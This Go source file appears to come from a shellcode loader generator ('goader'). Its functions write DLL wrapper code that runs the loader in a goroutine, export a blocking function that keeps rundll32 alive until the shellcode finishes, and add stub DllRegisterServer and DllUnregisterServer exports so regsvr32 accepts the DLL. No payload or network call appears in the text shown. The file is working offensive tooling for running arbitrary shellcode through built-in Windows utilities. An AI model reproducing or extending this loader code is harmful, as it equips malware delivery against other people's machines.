package main

import (
	"fmt"
	"io"
)

// writeCgoImport writes the bare `import "C"` line that enables CGO for the
// generated DLL file. No C preamble is used: all DLL exports are //export Go
// functions, which require an empty (or declaration-only) preamble.
func writeCgoImport(iw io.Writer) error {
	_, err := fmt.Fprint(iw, "import \"C\"\n\n")
	return err
}

// writeDllInit writes the package init() function.
//
// When an export function is requested, main() runs in a goroutine and signals
// dllDone when it finishes; the exported Go function (see writeDllExportFuncs)
// blocks on that channel so rundll32 stays alive until the shellcode completes.
//
// Without an export function (goader-only mode), main() is called directly —
// the goroutine is unnecessary because the loader executable keeps the process
// alive on its own (via fmt.Scanln).
func writeDllInit(iw io.Writer, exportFunc string) error {
	var err error
	if exportFunc != "" {
		if _, err = fmt.Fprint(
			iw, "var dllDone = make(chan struct{})\n\n",
		); err != nil {
			return err
		}
		_, err = fmt.Fprint(iw,
			"func init() {\n"+
				"\tbin = \"dll\"\n"+
				"\tgo func() {\n"+
				"\t\tmain()\n"+
				"\t\tclose(dllDone)\n"+
				"\t}()\n"+
				"}\n\n",
		)
	} else {
		_, err = fmt.Fprint(iw,
			"func init() {\n\tbin = \"dll\"\n\tmain()\n}\n\n",
		)
	}
	return err
}

// writeDllExportFuncs writes //export Go functions for each requested export.
//
// exportFunc (e.g. "Dllaze") becomes a blocking function that waits on dllDone,
// keeping rundll32 alive until the shellcode goroutine finishes.
//
// DllRegisterServer / DllUnregisterServer are stubs that return S_OK (0) so
// regsvr32 considers the DLL registered without any additional logic.
func writeDllExportFuncs(iw io.Writer, exportFunc string, regSvr32 bool) error {
	var err error
	if exportFunc != "" {
		if _, err = fmt.Fprintf(iw,
			"//export %s\nfunc %s() { <-dllDone }\n\n",
			exportFunc, exportFunc,
		); err != nil {
			return err
		}
	}
	if regSvr32 {
		if _, err = fmt.Fprint(iw,
			"//export DllRegisterServer\n"+
				"func DllRegisterServer() int32 { return 0 }\n\n",
		); err != nil {
			return err
		}
		if _, err = fmt.Fprint(iw,
			"//export DllUnregisterServer\n"+
				"func DllUnregisterServer() int32 { return 0 }\n\n",
		); err != nil {
			return err
		}
	}
	return nil
}
